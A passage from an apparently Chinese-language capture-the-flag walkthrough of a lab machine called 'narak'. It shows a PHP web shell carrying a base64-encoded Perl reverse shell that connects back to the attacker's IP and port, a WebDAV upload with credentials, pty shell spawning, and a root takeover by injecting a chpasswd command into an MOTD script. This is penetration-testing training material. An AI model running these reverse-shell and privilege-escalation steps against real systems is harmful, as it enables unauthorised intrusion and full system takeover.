+&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.
+
+&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.
+
+&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.
+
+&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.
+
+&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;
+
+cf(&#39;/tmp/.bc&#39;,$back_connect);
+
+$res = execute(which(&#39;perl&#39;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);
+
+?&gt;
+</code></pre></div>
+<p><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" /></p>
+<ol>
+<li><strong>上传shell</strong></li>
+</ol>
+<p><strong>cadaver *<em>http://192.168.8.132/webdav*</em></strong></p>
+<p><strong>username：yamdoot</strong></p>
+<p><strong>password:Swarg</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609217.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>再kali另一个终端开启监听，网页访问192.168.8.132/webdav</strong></p>
+<p><strong>已上传</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260970.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>再去访问shell.php</strong></p>
+<ol>
+<li><strong>建立交互式shell</strong></li>
+</ol>
+<p><strong>kali监听到结果：</strong></p>
+<p><strong>python3 -c 'import pty;pty.spawn("/bin/bash")'</strong></p>
+<p><strong>当前权限不是最高权限，还需要进一步提权</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609546.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>搜索信息</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609150.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260950.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>搜索到一串字符，搜索下Brainfuck可解码</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609880.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260956.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>​        <strong>得到明文密码：chitragupt</strong></p>
+<p><strong>猜想用户名应该是 inferno narak 中一个</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260921.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<h2 id="_3"><strong>三、提权</strong></h2>
+<ol>
+<li><strong>先尝试inferno登录l连接ssh</strong></li>
+</ol>
+<p><strong>连接成功</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609455.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p><strong>搜集信息</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609218.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<ol>
+<li><strong>利用了motd，通过修改ssh登陆时的欢迎信息对root密码进行修改：</strong></li>
+</ol>
+<p><strong>echo "echo 'root:inferno'|sudo chpasswd" &gt;&gt; /etc/update-motd.d/00-header</strong></p>
+<p><strong>退出后重新用inferno登录</strong></p>
+<p><strong>su -root</strong></p>
+<p><strong>成功获取root权限：</strong></p>
+<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609398.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
 
 
 
